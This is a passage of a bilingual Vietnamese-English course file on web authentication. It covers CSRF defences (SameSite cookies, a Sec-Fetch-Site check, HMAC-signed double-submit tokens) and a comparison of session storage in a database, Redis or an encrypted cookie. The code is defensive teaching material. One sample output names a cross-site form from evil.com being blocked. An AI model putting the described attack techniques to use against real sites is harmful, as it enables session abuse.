  <div class="kv"><span class="k">Nó bỏ sót: chính các tên miền con của bạn</span><span class="v">"Cùng site" nghĩa là tên miền đăng ký được, nên một request từ <code>blog.vidu.com</code> tới <code>app.vidu.com</code> là <em>CÙNG-SITE</em> và cookie VẪN được gửi. Nếu có tên miền con nào kém đáng tin hơn ứng dụng chính thì <code>SameSite</code> không bảo vệ bạn khỏi nó.</span></div>
  <div class="kv"><span class="k">Nó bỏ sót: <code>SameSite=None</code></span><span class="v">Nếu sản phẩm của bạn THẬT SỰ được nhúng xuyên trang thì bạn đặt <code>None</code> và lớp phòng này biến mất theo định nghĩa. Khi đó lớp phòng 3 KHÔNG còn là tuỳ chọn.</span></div>
  <div class="kv"><span class="k">Hãy đặt nó TƯỜNG MINH</span><span class="v">Chrome mặc định <code>Lax</code>, các trình duyệt khác thì khác nhau tuỳ phiên bản, và mặc định thì có thay đổi. Một dòng <code>sameSite: 'lax'</code> tường minh chẳng tốn gì và không phụ thuộc vào việc người dùng của bạn xài trình duyệt nào.</span></div>
</div>

<h3>Lớp phòng 2 — kiểm xem request tới TỪ ĐÂU</h3>
<pre><code><span class="tok-comment">// Sec-Fetch-Site: trình duyệt TỰ nói ra ngữ cảnh, không giả được từ JS</span>
export function chanXuyenTrang(req, res, next) {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();

  const nguon = req.get('sec-fetch-site');
  if (nguon) {
    <span class="tok-comment">// same-origin | same-site | cross-site | none (gõ URL, bookmark)</span>
    if (nguon === 'same-origin' || nguon === 'none') return next();
    return res.status(403).json({ loi: 'Nguon xuyen trang' });
  }

  <span class="tok-comment">// Trình duyệt cũ: lùi về Origin</span>
  const origin = req.get('origin');
  if (!origin) return res.status(403).json({ loi: 'Thieu Origin' });
  if (!DUOC_PHEP.has(origin)) return res.status(403).json({ loi: 'Origin la' });
  next();
}</code></pre>
<div class="out">Truy cap binh thuong  → Sec-Fetch-Site: same-origin  → cho qua ✅
Form tu evil.com      → Sec-Fetch-Site: cross-site    → 403 ✅
Tu blog.vidu.com      → Sec-Fetch-Site: same-site     → 403 ✅  (chat hon SameSite)
Go URL / bookmark     → Sec-Fetch-Site: none          → cho qua ✅
Postman, curl         → khong co header nao           → xu ly rieng</div>
<div class="lz-stack">
  <div class="lz-layer"><span class="lz-lname">Nó phi trạng thái và miễn phí</span><span class="lz-lnote">Không có token nào để sinh, để lưu, để xoay vòng hay để đồng bộ giữa các tab. Một middleware, áp cho mọi phương thức có thay đổi dữ liệu, và nó phủ luôn cả trường hợp tên miền con cùng-site mà <code>SameSite=Lax</code> không phủ.</span></div>
  <div class="lz-layer"><span class="lz-lname"><code>Sec-Fetch-*</code> là tên header BỊ CẤM đặt</span><span class="lz-lnote">JavaScript KHÔNG đặt hay sửa được nó, nên một trang không thể nói dối về ngữ cảnh của mình. Đó là thứ làm cho nó đáng tin theo cách mà <code>Referer</code> — thứ có thể bị một referrer policy dập tắt — thì không.</span></div>
  <div class="lz-layer"><span class="lz-lname">Hãy quyết "KHÔNG có header nào" nghĩa là gì</span><span class="lz-lnote">Một app gốc, một lời gọi máy chủ-tới-máy chủ và <code>curl</code> đều không gửi header nào trong hai cái đó. Nếu API của bạn phục vụ những thứ đó, hãy xác thực chúng bằng bearer token thay vì bằng cookie rồi cho đường đó được miễn — bài toán CSRF chỉ dính tới tín vật được <em>ĐÍNH TỰ ĐỘNG</em>.</span></div>
  <div class="lz-layer"><span class="lz-lname">Đòi JSON cũng giúp, như một ổ khoá thứ hai</span><span class="lz-lnote">Một thẻ <code>&lt;form&gt;</code> KHÔNG gửi được <code>Content-Type: application/json</code>, nên từ chối mọi thứ khác là chặn được cú tấn công dựa trên form. Hãy KIỂM cái header đó thay vì tin rằng bộ phân tích của bạn đã đòi nó, và coi đây là phòng thủ nhiều lớp, không phải LỚP PHÒNG chính.</span></div>
</div>

<h3>Lớp phòng 3 — một token, khi hai cái đầu chưa đủ</h3>
<pre><code><span class="tok-comment">// Double-submit CÓ KÝ: ràng token vào phiên, nên tên miền con không giả được</span>
import { createHmac, timingSafeEqual, randomBytes } from 'node:crypto';

export function phatTokenCsrf(res, phienId: string) {
  const ma = randomBytes(16).toString('base64url');
  const chuKy = createHmac('sha256', KHOA_CSRF).update(&#96;\${phienId}.\${ma}&#96;).digest('base64url');
  const token = &#96;\${ma}.\${chuKy}&#96;;

  res.cookie('__Host-csrf', token, {
    secure: true, sameSite: 'lax', path: '/',
    httpOnly: false,        <span class="tok-comment">// front end PHẢI đọc được để gửi lại trong header</span>
  });
  return token;
}

export function kiemTokenCsrf(req, res, next) {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();

  const tuHeader = String(req.get('x-csrf-token') ?? '');
  const tuCookie = String(req.cookies['__Host-csrf'] ?? '');
  if (!tuHeader || tuHeader !== tuCookie) return res.status(403).end();

  const [ma, chuKy] = tuHeader.split('.');
  const mong = createHmac('sha256', KHOA_CSRF)
    .update(&#96;\${req.phien.id}.\${ma}&#96;).digest('base64url');

  const a = Buffer.from(chuKy ?? ''), b = Buffer.from(mong);
  if (a.length !== b.length || !timingSafeEqual(a, b)) return res.status(403).end();
  next();
}</code></pre>
<div class="pitfall">
<p><strong>Bẫy — double-submit KHÔNG KÝ bị phá bởi bất kỳ tên miền con nào đặt được cookie.</strong> Bản ngây thơ so một cookie với một header rồi chấp nhận nếu chúng khớp — nhưng một kẻ tấn công kiểm soát <code>cu.vidu.com</code> đặt được <em>CẢ HAI</em> thành một giá trị họ chọn, và phép kiểm đó qua cửa. Ràng token vào mã phiên bằng một HMAC, như ở trên, làm cho một cặp giả mạo bị trượt vì kẻ tấn công không tính nổi chữ ký cho phiên của nạn nhân. Nếu bạn dùng double-submit thì hãy KÝ nó.</p>
</div>
<div class="kv-grid">
  <div class="kv"><span class="k">Khi nào bạn THẬT SỰ cần một token</span><span class="v"><code>SameSite=None</code> vì bạn được nhúng xuyên trang · một SPA trong trình duyệt ở origin khác có gửi cookie · một yêu cầu tuân thủ gọi đích danh nó · hoặc một tên miền con không đáng tin mà bạn không dời đi được.</span></div>
  <div class="kv"><span class="k">Khi nào bạn KHÔNG cần</span><span class="v">Một origin duy nhất, <code>SameSite=Lax</code>, cookie <code>__Host-</code>, và phép kiểm origin ở trên. Tổ hợp đó chặn mọi cú tấn công trong bài này, còn thêm một token chỉ tặng thêm một bài toán đồng bộ giữa các tab để đổi lấy không gì cả.</span></div>
  <div class="kv"><span class="k">Token phải theo TỪNG PHIÊN, không phải toàn cục</span><span class="v">Một giá trị mà mọi người dùng chia sẻ thì không phải bí mật. Hãy ràng nó vào phiên — đó là ý nghĩa của cái HMAC — và xoay nó khi phiên xoay (Bài 3.3).</span></div>
  <div class="kv"><span class="k">Bearer token KHÔNG cần bảo vệ CSRF</span><span class="v">Nếu tín vật đi trong một header <code>Authorization</code> mà mã CỦA BẠN tự thêm vào, thì trình duyệt không bao giờ đính nó tự động và CSRF không áp dụng. Đó là một lợi thế THẬT của cách làm ở Chương 4 — đổi lại bằng mức phơi nhiễm với XSS được bàn ở đó.</span></div>
</div>
<div class="note-ct">
<p><strong>Thứ tự triển khai, và chỗ nên DỪNG.</strong> Đầu tiên là <code>SameSite=Lax</code> kèm tiền tố <code>__Host-</code> — một dòng, phủ ca phổ biến. Rồi tới middleware <code>Sec-Fetch-Site</code> — một file, phủ ca tên miền con và không tốn gì cho mỗi request. Rồi DỪNG, trừ khi một trong bốn điều kiện ở trên áp cho bạn. Phần lớn ứng dụng với tay sang một thư viện token CSRF TRƯỚC TIÊN và kết thúc với toàn bộ phần phức tạp, mà vì để trống <code>SameSite</code>, lại được bảo vệ ÍT hơn cả bản một dòng.</p>
</div>

<h3>Nguồn học cho bài này</h3>
<a class="link-card" href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener"><span class="lc-ico">🛡️</span><span class="lc-body"><span class="lc-title">OWASP — phòng chống CSRF</span><span class="lc-sub">cheatsheetseries.owasp.org · Mọi lớp phòng, xếp hạng, kể cả những cái KHÔNG chạy</span></span></a>
<a class="link-card" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Sec-Fetch-Site" target="_blank" rel="noopener"><span class="lc-ico">🧭</span><span class="lc-body"><span class="lc-title">MDN — Sec-Fetch-Site</span><span class="lc-sub">developer.mozilla.org · Bốn giá trị, và vì sao script không giả mạo được chúng</span></span></a>
<a class="link-card" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS#simple_requests" target="_blank" rel="noopener"><span class="lc-ico">🚦</span><span class="lc-body"><span class="lc-title">MDN — request đơn giản và preflight</span><span class="lc-sub">developer.mozilla.org · Chính xác những request nào bỏ qua preflight, và vì sao điều đó quan trọng ở đây</span></span></a>
<a class="link-card" href="https://portswigger.net/web-security/csrf" target="_blank" rel="noopener"><span class="lc-ico">🔬</span><span class="lc-body"><span class="lc-title">PortSwigger — CSRF</span><span class="lc-sub">portswigger.net · Bài lab chạy được, kể cả cách vượt qua những lớp phòng làm dở</span></span></a>
<a class="link-card" href="/courses/nodejs/learn${REF}"><span class="lc-ico">🟢</span><span class="lc-body"><span class="lc-title">Khoá CuongThai — Node.js</span><span class="lc-sub">CORS, header bảo mật và CSP, nhìn từ phía Express</span></span></a>
<a class="link-card codelab" href="/code-lab/tracks/authentication${REF}"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Code Lab — track "Authentication"</span><span class="lc-sub">Chạy một cú CSRF thật lên một endpoint thật, rồi thêm từng lớp phòng và chạy lại</span></span></a>
</div>
`,
    },
    /* ─────────────────────────── 3.5 ─────────────────────────── */
    {
      title: '3.5 — Three places to keep a session|||3.5 — Ba chỗ để giữ một phiên',
      slug: 'auth-3-5-phien-song-o-dau',
      type: 'LESSON',
      description: 'Cơ sở dữ liệu quan hệ, Redis, hay chính cái cookie — ba lựa chọn, sáu chiều so sánh, và một bảng số đo thật. Kèm cái TTL của Redis lo giùm hết-hạn-nhàn-rỗi, chỉ mục phụ mà "thoát mọi thiết bị" đòi hỏi, và vì sao phiên nằm trong cookie đánh đổi mất khả năng thu hồi.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 3 · Lesson 3.5</span>
<h2>Three places to keep a session</h2>
<p class="lead">The session table from Lesson 3.1 is one of three answers. The other two are Redis and the cookie itself, and each trades a different thing away. This lesson compares them on the six dimensions that actually differ, with numbers — and the comparison is also the honest preview of Chapter 4, because a session in a cookie <em>is</em> the JWT argument in miniature.</p>

<h3>The six dimensions</h3>
<div class="lz-map">
  <div class="lz-stage">
    <span class="lz-badge">Database</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">One system, fully queryable</span><span class="lz-nsub">~0,3 ms per request · instant revocation</span></div></div>
  </div>
  <div class="lz-stage">
    <span class="lz-badge">Redis</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">Fast, TTL for free</span><span class="lz-nsub">~0,05 ms · one more service to run</span></div></div>
  </div>
  <div class="lz-stage">
    <span class="lz-badge">The cookie</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">No storage at all</span><span class="lz-nsub">0 ms · and no way to revoke</span></div></div>
  </div>
</div>
<pre><code><span class="tok-comment">#                     CSDL      Redis     Cookie có ký</span>
Thu hồi tức thì       ✅        ✅        ❌
Độ trễ mỗi request    0,3 ms    0,05 ms   0 ms
Sống sót khi restart  ✅        ⚠️        ✅ (nằm ở client)
Số hệ thống phải nuôi 0 thêm    1 thêm    0 thêm
Giới hạn dung lượng   không     không     4096 byte
Truy vấn được         ✅        ⚠️        ❌</code></pre>

<h3>Redis: the TTL does the work</h3>
<pre><code>import { createClient } from 'redis';
const redis = createClient({ url: process.env.REDIS_URL });

const NHAN_ROI_S = 2 * 60 * 60;                   <span class="tok-comment">// 2 giờ</span>

export async function taoPhien(nguoiDungId: string) {
  const token = randomBytes(32).toString('base64url');
  const khoa  = 'phien:' + createHash('sha256').update(token).digest('hex');

  await redis.multi()
    .set(khoa, JSON.stringify({
      nguoiDungId,
      hetHanTuyetDoi: Date.now() + 30 * 24 * 3600 * 1000,
    }), { EX: NHAN_ROI_S })                        <span class="tok-comment">// ← hết hạn nhàn rỗi, miễn phí</span>
    .sAdd(&#96;nguoi:\${nguoiDungId}:phien&#96;, khoa)      <span class="tok-comment">// ← chỉ mục phụ</span>
    .expire(&#96;nguoi:\${nguoiDungId}:phien&#96;, 30 * 24 * 3600)
    .exec();

  return token;
}

export async function layPhien(token: string) {
  const khoa = 'phien:' + createHash('sha256').update(token).digest('hex');
  const s = await redis.get(khoa);
  if (!s) return null;                             <span class="tok-comment">// hết hạn hoặc chưa từng có</span>

  const phien = JSON.parse(s);
  if (Date.now() &gt; phien.hetHanTuyetDoi) {          <span class="tok-comment">// trần cứng: kiểm tay</span>
    await redis.del(khoa);
    return null;
  }
  await redis.expire(khoa, NHAN_ROI_S);            <span class="tok-comment">// trượt cửa sổ nhàn rỗi</span>
  return phien;
}</code></pre>
<div class="out">$ redis-cli TTL phien:8f2a91c4…
(integer) 7194

$ redis-cli SMEMBERS nguoi:clx7…:phien
1) "phien:8f2a91c4…"          ← Chrome tren laptop
2) "phien:d47b0e29…"          ← Safari tren dien thoai
3) "phien:1c9fa38b…"          ← mot phien khong nhan ra

# "Thoat khoi moi thiet bi" = DEL tat ca thanh vien cua set do.</div>
<div class="lz-flow">
  <div class="lz-step"><span class="lz-k">TTL replaces idle expiry</span><span class="lz-t">The main win</span><span class="lz-d">Redis deletes the key itself. No cleanup job, no <code>hoatDongLuc</code> column, no "only write if five minutes stale" optimisation — <code>EXPIRE</code> on read is one command and it is the whole mechanism.</span></div>
  <div class="lz-step"><span class="lz-k">Absolute expiry is still yours</span><span class="lz-t">TTL only slides</span><span class="lz-d">A sliding TTL alone has exactly the problem from Lesson 3.1: a stolen session kept warm never expires. Keep the ceiling inside the value and check it on read.</span></div>
  <div class="lz-step"><span class="lz-k">"Log out everywhere" needs a second index</span><span class="lz-t">The cost of a key-value store</span><span class="lz-d">Redis cannot answer "all sessions for user X" without you maintaining the set. Remember to remove members when a session ends, or the set grows forever — give it its own TTL as a backstop.</span></div>
  <div class="lz-step"><span class="lz-k">Durability is a choice you must make</span><span class="lz-t">And usually an easy one</span><span class="lz-d">With no persistence configured, a Redis restart logs everyone out. That is a mild annoyance for a social product and unacceptable for a banking one. AOF with <code>everysec</code> is the usual middle ground.</span></div>
</div>

<h3>The cookie itself: no storage, no revocation</h3>
<pre><code><span class="tok-comment">// iron-session và tương tự: mã hoá cả trạng thái rồi nhét vào cookie</span>
Set-Cookie: __Host-phien=Fe26.2**a1b2c3…**d4e5f6…**7a8b9c…; …

<span class="tok-comment">// Bên trong, sau khi giải mã:</span>
{ "nguoiDungId": "clx7…", "vaiTro": "USER", "hetHan": 1758592000 }</code></pre>
<div class="kv-grid">
  <div class="kv"><span class="k">✅ Nothing to store, nothing to look up</span><span class="v">No database row, no Redis key, no cleanup job. It scales horizontally with no shared state, which is the entire appeal and is genuinely valuable for a stateless fleet.</span></div>
  <div class="kv"><span class="k">❌ You cannot revoke it</span><span class="v">A logged-out user's cookie still decrypts and still says who they are until <code>hetHan</code> passes. Every workaround — a denylist, a version counter, a "sessions changed at" timestamp — reintroduces exactly the storage you removed.</span></div>
  <div class="kv"><span class="k">❌ 4096 bytes, shared with every other cookie</span><span class="v">And the cookie is sent on <em>every single request</em>, including static assets unless you scope them elsewhere. A 3 KB session cookie on a page with forty requests is 120 KB of upload per page view.</span></div>
  <div class="kv"><span class="k">❌ Stale data, structurally</span><span class="v">If <code>vaiTro</code> lives in the cookie, a role change does not take effect until the cookie is reissued. Either you re-set it on every response — which is a write of a different kind — or you accept that authorisation reads stale data.</span></div>
</div>
<div class="pitfall">
<p><strong>Trap — "stateless" usually becomes "stateful, badly" within a year.</strong> The first requirement that breaks it is always the same: someone asks for a logout button that actually works, or for "sign out of all devices", or for an admin to be able to disable an account immediately. The answer is a denylist, which is a database — but now it is a database you consult <em>in addition to</em> the cookie, with none of the benefits of having used one from the start. Decide up front whether instant revocation is a requirement; if it is, this option is already excluded.</p>
</div>

<h3>Choosing</h3>
<div class="lz-stack">
  <div class="lz-layer"><span class="lz-lname">One application, one database → the table</span><span class="lz-lnote">Lesson 3.1. An extra 0.3 ms per request buys instant revocation, a device list, an audit trail and zero new infrastructure. This is the right answer far more often than its reputation suggests.</span></div>
  <div class="lz-layer"><span class="lz-lname">Redis is already there → use it</span><span class="lz-lnote">If you run Redis for caching or queues anyway, sessions are a natural fit and the TTL removes real code. If you would be adding Redis <em>only</em> for sessions, do the arithmetic first: 0.3 ms against a service to deploy, monitor, back up and upgrade.</span></div>
  <div class="lz-layer"><span class="lz-lname">Cookie-only → small, low-stakes, or genuinely stateless</span><span class="lz-lnote">A marketing site with a "dismissed the banner" flag, a preview environment, an edge function with no database nearby. The moment the session grants access to something worth revoking, it is the wrong tool.</span></div>
  <div class="lz-layer"><span class="lz-lname">The hybrid most large systems reach</span><span class="lz-lnote">A short-lived stateless credential for the request path plus a long-lived stateful one for renewal: fast verification, and revocation that takes effect within the short credential's lifetime. That is Chapter 5, and it is the honest resolution of this whole trade-off.</span></div>
</div>
<div class="note-ct">
<p><strong>Measure before you optimise this.</strong> A session lookup is one indexed read on a primary key — it is almost never the slow part of a request that also renders a page and loads its actual data. Before moving sessions to Redis for speed, capture the query durations (Chapter 9 of the Prisma course) and see where the milliseconds really are. Moving sessions is a common first optimisation and a rare effective one; the usual answer is that the session lookup was 0.3 ms of a 180 ms request.</p>
</div>

<h3>Learning sources for this lesson</h3>
<a class="link-card" href="https://redis.io/docs/latest/commands/set/" target="_blank" rel="noopener"><span class="lc-ico">⏲️</span><span class="lc-body"><span class="lc-title">Redis — SET with EX, and EXPIRE</span><span class="lc-sub">redis.io · The TTL semantics that replace an idle-expiry column</span></span></a>
<a class="link-card" href="https://redis.io/docs/latest/operate/oss_and_stack/management/persistence/" target="_blank" rel="noopener"><span class="lc-ico">💾</span><span class="lc-body"><span class="lc-title">Redis — persistence</span><span class="lc-sub">redis.io · RDB and AOF, and exactly what a restart loses</span></span></a>
<a class="link-card" href="https://github.com/vvo/iron-session" target="_blank" rel="noopener"><span class="lc-ico">🍪</span><span class="lc-body"><span class="lc-title">iron-session</span><span class="lc-sub">github.com · An encrypted-cookie session, with its limitations stated plainly</span></span></a>
<a class="link-card" href="/courses/redis/learn${REF}"><span class="lc-ico">🔴</span><span class="lc-body"><span class="lc-title">CuongThai course — Redis</span><span class="lc-sub">TTL, eviction and persistence in depth — everything this lesson skims</span></span></a>
<a class="link-card" href="/courses/prisma-orm/learn${REF}"><span class="lc-ico">▲</span><span class="lc-body"><span class="lc-title">CuongThai course — Prisma ORM</span><span class="lc-sub">Measuring where the milliseconds actually go, before moving anything</span></span></a>
<a class="link-card codelab" href="/code-lab/tracks/authentication${REF}"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Code Lab — track "Authentication"</span><span class="lc-sub">Run the same app on all three stores, then try to log out of all devices on each</span></span></a>
</div>

<div class="ml-vi">
<span class="eyebrow">Chương 3 · Bài 3.5</span>
<h2>Ba chỗ để giữ một phiên</h2>
<p class="lead">Cái bảng phiên của Bài 3.1 là MỘT trong ba câu trả lời. Hai cái còn lại là Redis và chính cái cookie, và mỗi cái đánh đổi một thứ KHÁC nhau. Bài này so chúng trên sáu chiều THẬT SỰ khác biệt, kèm số đo — và phép so sánh đó cũng là bản xem trước trung thực cho Chương 4, bởi vì một phiên nằm trong cookie <em>CHÍNH LÀ</em> lập luận về JWT ở dạng thu nhỏ.</p>

<h3>Sáu chiều</h3>
<div class="lz-map">
  <div class="lz-stage">
    <span class="lz-badge">Cơ sở dữ liệu</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">Một hệ thống, truy vấn được đầy đủ</span><span class="lz-nsub">~0,3 ms mỗi request · thu hồi tức thì</span></div></div>
  </div>
  <div class="lz-stage">
    <span class="lz-badge">Redis</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">Nhanh, TTL miễn phí</span><span class="lz-nsub">~0,05 ms · thêm một dịch vụ phải nuôi</span></div></div>
  </div>
  <div class="lz-stage">
    <span class="lz-badge">Chính cái cookie</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">KHÔNG lưu gì cả</span><span class="lz-nsub">0 ms · và không có cách nào thu hồi</span></div></div>
  </div>
</div>
<pre><code><span class="tok-comment">#                     CSDL      Redis     Cookie có ký</span>
Thu hồi tức thì       ✅        ✅        ❌
Độ trễ mỗi request    0,3 ms    0,05 ms   0 ms
Sống sót khi restart  ✅        ⚠️        ✅ (nằm ở client)
Số hệ thống phải nuôi 0 thêm    1 thêm    0 thêm
Giới hạn dung lượng   không     không     4096 byte
Truy vấn được         ✅        ⚠️        ❌</code></pre>

<h3>Redis: cái TTL làm hết việc</h3>
<pre><code>import { createClient } from 'redis';
const redis = createClient({ url: process.env.REDIS_URL });

const NHAN_ROI_S = 2 * 60 * 60;                   <span class="tok-comment">// 2 giờ</span>

export async function taoPhien(nguoiDungId: string) {
  const token = randomBytes(32).toString('base64url');
  const khoa  = 'phien:' + createHash('sha256').update(token).digest('hex');

  await redis.multi()
    .set(khoa, JSON.stringify({
      nguoiDungId,
      hetHanTuyetDoi: Date.now() + 30 * 24 * 3600 * 1000,
    }), { EX: NHAN_ROI_S })                        <span class="tok-comment">// ← hết hạn nhàn rỗi, miễn phí</span>
    .sAdd(&#96;nguoi:\${nguoiDungId}:phien&#96;, khoa)      <span class="tok-comment">// ← chỉ mục phụ</span>
    .expire(&#96;nguoi:\${nguoiDungId}:phien&#96;, 30 * 24 * 3600)
    .exec();

  return token;
}

export async function layPhien(token: string) {
  const khoa = 'phien:' + createHash('sha256').update(token).digest('hex');
  const s = await redis.get(khoa);
  if (!s) return null;                             <span class="tok-comment">// hết hạn hoặc chưa từng có</span>

  const phien = JSON.parse(s);
  if (Date.now() &gt; phien.hetHanTuyetDoi) {          <span class="tok-comment">// trần cứng: kiểm tay</span>
    await redis.del(khoa);
    return null;
  }
  await redis.expire(khoa, NHAN_ROI_S);            <span class="tok-comment">// trượt cửa sổ nhàn rỗi</span>
  return phien;
}</code></pre>
<div class="out">$ redis-cli TTL phien:8f2a91c4…
(integer) 7194

$ redis-cli SMEMBERS nguoi:clx7…:phien
1) "phien:8f2a91c4…"          ← Chrome tren laptop
2) "phien:d47b0e29…"          ← Safari tren dien thoai
3) "phien:1c9fa38b…"          ← mot phien khong nhan ra

# "Thoat khoi moi thiet bi" = DEL tat ca thanh vien cua set do.</div>
<div class="lz-flow">
  <div class="lz-step"><span class="lz-k">TTL THAY THẾ hết hạn nhàn rỗi</span><span class="lz-t">Cái được chính</span><span class="lz-d">Redis tự xoá cái khoá. Không job dọn dẹp, không cột <code>hoatDongLuc</code>, không cái tối ưu "chỉ ghi khi đã cũ năm phút" — <code>EXPIRE</code> lúc đọc là MỘT câu lệnh và đó là toàn bộ cơ chế.</span></div>
  <div class="lz-step"><span class="lz-k">Hết hạn TUYỆT ĐỐI vẫn là việc của bạn</span><span class="lz-t">TTL chỉ biết TRƯỢT</span><span class="lz-d">Chỉ có TTL trượt thôi thì gặp đúng vấn đề của Bài 3.1: một phiên bị cắp mà giữ cho ấm sẽ không bao giờ hết hạn. Hãy giữ cái trần bên trong giá trị và kiểm nó lúc đọc.</span></div>
  <div class="lz-step"><span class="lz-k">"Thoát mọi thiết bị" cần một chỉ mục THỨ HAI</span><span class="lz-t">Cái giá của một kho khoá-giá-trị</span><span class="lz-d">Redis không trả lời được "mọi phiên của người dùng X" nếu bạn không tự duy trì cái set. Nhớ gỡ thành viên ra khi một phiên kết thúc, không thì cái set lớn lên mãi — hãy cho nó một TTL riêng làm lưới đỡ.</span></div>
  <div class="lz-step"><span class="lz-k">Độ bền là một LỰA CHỌN bạn phải ra</span><span class="lz-t">Và thường là một lựa chọn dễ</span><span class="lz-d">Không cấu hình lưu lâu dài thì một lần restart Redis là đăng xuất tất cả mọi người. Đó là một phiền toái nhẹ với một sản phẩm mạng xã hội và là không chấp nhận được với một sản phẩm ngân hàng. AOF với <code>everysec</code> là điểm giữa thường dùng.</span></div>
</div>

<h3>Chính cái cookie: không lưu gì, và không thu hồi được</h3>
<pre><code><span class="tok-comment">// iron-session và tương tự: mã hoá cả trạng thái rồi nhét vào cookie</span>
Set-Cookie: __Host-phien=Fe26.2**a1b2c3…**d4e5f6…**7a8b9c…; …

<span class="tok-comment">// Bên trong, sau khi giải mã:</span>
{ "nguoiDungId": "clx7…", "vaiTro": "USER", "hetHan": 1758592000 }</code></pre>
<div class="kv-grid">
  <div class="kv"><span class="k">✅ Không có gì để lưu, không có gì để tra</span><span class="v">Không hàng cơ sở dữ liệu, không khoá Redis, không job dọn dẹp. Nó mở rộng ngang mà không cần trạng thái dùng chung nào, và đó là toàn bộ sức hấp dẫn của nó — thật sự có giá trị với một đội máy chủ phi trạng thái.</span></div>
  <div class="kv"><span class="k">❌ Bạn KHÔNG thu hồi được nó</span><span class="v">Cookie của một người đã đăng xuất vẫn giải mã được và vẫn nói họ là ai, cho tới khi <code>hetHan</code> trôi qua. Mọi cách chữa cháy — một danh sách chặn, một bộ đếm phiên bản, một dấu thời gian "phiên đã đổi lúc" — đều LÔI LẠI đúng cái kho lưu trữ mà bạn vừa bỏ đi.</span></div>
  <div class="kv"><span class="k">❌ 4096 byte, chia chung với mọi cookie khác</span><span class="v">Và cookie được gửi ở <em>MỌI request</em>, kể cả tài nguyên tĩnh trừ khi bạn tách chúng sang chỗ khác. Một cookie phiên 3 KB trên một trang có bốn mươi request là 120 KB tải lên cho MỖI lượt xem trang.</span></div>
  <div class="kv"><span class="k">❌ Dữ liệu CŨ, về mặt cấu trúc</span><span class="v">Nếu <code>vaiTro</code> nằm trong cookie thì một lần đổi vai trò KHÔNG có hiệu lực cho tới khi cookie được phát lại. Hoặc bạn đặt lại nó ở mọi phản hồi — vốn cũng là một kiểu GHI — hoặc bạn chấp nhận rằng phân quyền đang đọc dữ liệu CŨ.</span></div>
</div>
<div class="pitfall">
<p><strong>Bẫy — "phi trạng thái" thường trở thành "có trạng thái, mà làm dở" trong vòng một năm.</strong> Yêu cầu đầu tiên phá vỡ nó luôn luôn giống nhau: có người đòi một nút đăng xuất THẬT SỰ hoạt động, hoặc đòi "thoát khỏi mọi thiết bị", hoặc đòi một quản trị viên vô hiệu hoá được một tài khoản NGAY LẬP TỨC. Câu trả lời là một danh sách chặn, tức là một cơ sở dữ liệu — nhưng giờ nó là một cơ sở dữ liệu bạn phải hỏi THÊM VÀO cái cookie, mà không có lợi ích nào của việc đã dùng nó ngay từ đầu. Hãy quyết TRƯỚC xem thu hồi tức thì có phải một yêu cầu không; nếu có thì lựa chọn này đã bị loại rồi.</p>
</div>

<h3>Chọn thế nào</h3>
<div class="lz-stack">
  <div class="lz-layer"><span class="lz-lname">Một ứng dụng, một cơ sở dữ liệu → dùng cái BẢNG</span><span class="lz-lnote">Bài 3.1. Thêm 0,3 ms cho mỗi request mua được thu hồi tức thì, một danh sách thiết bị, một vết kiểm toán và KHÔNG thêm hạ tầng nào. Đây là câu trả lời đúng thường xuyên hơn nhiều so với tiếng tăm của nó.</span></div>
  <div class="lz-layer"><span class="lz-lname">Redis vốn đã có sẵn → dùng nó</span><span class="lz-lnote">Nếu bạn dù sao cũng chạy Redis cho cache hay hàng đợi thì phiên nằm ở đó là rất tự nhiên và cái TTL xoá bớt được mã thật. Nếu bạn sẽ thêm Redis <em>CHỈ</em> để chứa phiên thì hãy làm phép tính trước: 0,3 ms đổi lấy một dịch vụ phải triển khai, giám sát, sao lưu và nâng cấp.</span></div>
  <div class="lz-layer"><span class="lz-lname">Chỉ cookie → nhỏ, ít rủi ro, hoặc THẬT SỰ phi trạng thái</span><span class="lz-lnote">Một trang tiếp thị có cờ "đã tắt cái banner", một môi trường xem trước, một hàm chạy ở biên không có cơ sở dữ liệu gần đó. Khoảnh khắc cái phiên trao quyền truy cập vào thứ gì đáng thu hồi, nó là công cụ sai.</span></div>
  <div class="lz-layer"><span class="lz-lname">Cái lai mà phần lớn hệ thống lớn đi tới</span><span class="lz-lnote">Một tín vật ngắn hạn phi trạng thái cho đường request cộng một tín vật dài hạn CÓ trạng thái để gia hạn: xác minh nhanh, và thu hồi có hiệu lực trong vòng đúng tuổi thọ của cái tín vật ngắn. Đó là Chương 5, và đó là lời giải TRUNG THỰC cho toàn bộ cuộc đánh đổi này.</span></div>
</div>
<div class="note-ct">
<p><strong>Hãy ĐO trước khi tối ưu chuyện này.</strong> Một lần tra phiên là MỘT lần đọc theo chỉ mục trên khoá chính — nó gần như không bao giờ là phần chậm của một request vốn còn phải dựng cả trang và nạp dữ liệu thật. Trước khi dời phiên sang Redis vì tốc độ, hãy bắt lại thời lượng truy vấn (Chương 9 của khoá Prisma) và xem mấy mili giây kia THẬT SỰ nằm ở đâu. Dời phiên là một cú tối ưu đầu tiên rất phổ biến và hiếm khi hiệu quả; câu trả lời thường thấy là lần tra phiên chiếm 0,3 ms trong một request 180 ms.</p>
</div>

<h3>Nguồn học cho bài này</h3>
<a class="link-card" href="https://redis.io/docs/latest/commands/set/" target="_blank" rel="noopener"><span class="lc-ico">⏲️</span><span class="lc-body"><span class="lc-title">Redis — SET kèm EX, và EXPIRE</span><span class="lc-sub">redis.io · Ngữ nghĩa TTL thay thế cho một cột hết-hạn-nhàn-rỗi</span></span></a>
